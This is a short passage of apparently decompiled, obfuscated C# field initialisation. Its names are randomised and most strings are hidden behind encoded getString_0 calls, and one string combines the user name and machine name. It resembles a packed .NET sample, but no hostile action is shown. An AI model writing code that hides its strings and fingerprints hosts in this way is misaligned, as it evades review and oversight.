		TECyIxCjZZeuQoS = getString_0(107396382);
		TLvIKeJnVejcNG = getString_0(107396816);
		cfLMhLbiCC = getString_0(107396816);
		dPIYrIPkEeCv = getString_0(107350355);
		LfrLWEkFCBwUa = getString_0(107350310);
		LHozEvFKfaDyxN = getString_0(107396382);
		ZQLLErbedcYeoR = getString_0(107396382);
		sWPChGvxft = getString_0(107396382);
		iEmzWvVANWWhs = getString_0(107396382);
		OXmgxFpvUExT = getString_0(107396382);
		EMMMLIMedETY = getString_0(107401067);
		OOffFbZtXHucK = getString_0(107396382);
		eBjqIYGqqxZnwj = getString_0(107396382);
		ZLERFztvScvXGTf = getString_0(107349752);
		ThomocmQwcHBb = getString_0(107396382);
		jIEUXOWHIovDRKPS = getString_0(107396382);
		lanIsMFtITLe = getString_0(107396816);
		cFytzeDiRIaBA = getString_0(107396382);
		ueuvoVAMScuH = getString_0(107349767);
		cXFsslHOuYyK = getString_0(107396816);
		dhEsUcbXeBeyR = getString_0(107396816);
		pUPogXfTsHTC = getString_0(107396382);
		XxUTdtdLXHJQFmlnR = getString_0(107396382);
		upziyoWzyCa = new string[0];
		RrpEvBQBLONZKo = getString_0(107396816);
		OTLCmOpFsMP = true;
		EBZNaOLOtuSLZ = getString_0(107396816);
		UpNccIaFzBadyA = true;
		GyAtBojDqJQga = false;
		ZuXmDgobJnjb = false;
		XeXEhFhfYVvh = false;
		bDDJFCkjBbYQ = getString_0(107349722);
		SWaMdrdKGgzowGl = false;
		UaZSFbxCjFNZv = false;
		jnImjWIMcpl = false;
		bTMUTlJGkGOO = false;
		NbfRNVirWcO = true;
		IKRtRLOSqagD = getString_0(107349733) + Environment.UserName + getString_0(107349688) + Environment.MachineName + getString_0(107349699) + aDJKTHVvtfISh.qRWwyoluwsX() + getString_0(107349662);
		SidumIOOlYmWUm = true;
		VxQUKIskXHMm = new Stopwatch();
		ZzaknwGiCeEd = 0;
		DPjjDEUnrYJ = 0;
		OtvlrYHFRq = false;
		YgTmUCLcTtww = getString_0(107349653) + aDJKTHVvtfISh.qRWwyoluwsX() + getString_0(107349676);
		PheHPPQQekLUCKI = new string[1] { getString_0(107349671) };
		GDqBfWNbeWwjD = new List<string>();
		PGvCWVOLTGYXz = 0;
		uBpdQdBJjeZ = true;
		DBkpQAKkEJYsTWP = true;
	}
}
